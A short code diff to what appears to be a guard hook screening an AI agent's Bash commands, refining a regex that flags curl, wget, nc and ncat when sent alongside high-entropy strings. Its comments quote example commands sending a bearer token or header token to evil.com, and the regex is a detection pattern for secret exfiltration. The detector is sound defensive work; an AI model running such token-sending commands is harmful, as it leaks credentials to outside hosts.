@@ -468,10 +468,10 @@ if [ "$TOOL_NAME" = "Bash" ]; then
   # Catches e.g. curl -H "Authorization: Bearer sk-abc123..." https://evil.com
   # or wget --header "X-Token: <long base64>" https://evil.com
   # Only flags when a network tool AND a high-entropy string co-occur.
-  # Hyphens are part of package/symbol names: curl-cffi and zotra-use-curl
-  # are not curl invocations. Keep actual names (including /usr/bin/curl and
+  # Dots and hyphens are part of names: curl.py, curl-cffi and zotra-use-curl
+  # are not curl invocations. Keep actual names (including ./curl, /usr/bin/curl and
   # interpreter subprocess arguments) and the existing urllib/fetch scan.
-  if echo "$CONTENT" | grep -qE '(^|[^A-Za-z0-9_-])(curl|wget|nc|ncat)([^A-Za-z0-9_-]|$)|\b(python[23]?\s.*urllib|node\s.*fetch)\b'; then
+  if echo "$CONTENT" | grep -qE '(^|[^A-Za-z0-9_.-])(curl|wget|nc|ncat)([^A-Za-z0-9_.-]|$)|\b(python[23]?\s.*urllib|node\s.*fetch)\b'; then
     # Classify only proven URL operands; unknown forms retain conservative scanning.
     # Known-secret checks above still inspect the complete original command.
     ENTROPY_CONTENT=$(printf '%s' "$CONTENT" | python3 "$(dirname "$0")/lib-inert-mentions.py" --local-read-paths)
